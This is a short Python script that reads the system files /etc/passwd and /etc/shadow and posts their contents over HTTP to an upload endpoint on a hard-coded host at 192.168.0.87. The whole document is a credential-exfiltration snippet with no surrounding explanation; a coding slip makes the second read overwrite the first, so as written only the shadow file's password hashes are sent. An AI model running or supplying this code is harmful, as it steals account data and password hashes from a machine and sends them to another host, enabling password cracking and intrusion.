import requests
URL="https://192.168.0.87/upload"
data={}
with open('/etc/passwd') as f:
    data['data_p'] = f.read()
with open('/etc/shadow') as f:
    data = {'data_s':f.read()}
requests.post(URL,data=data)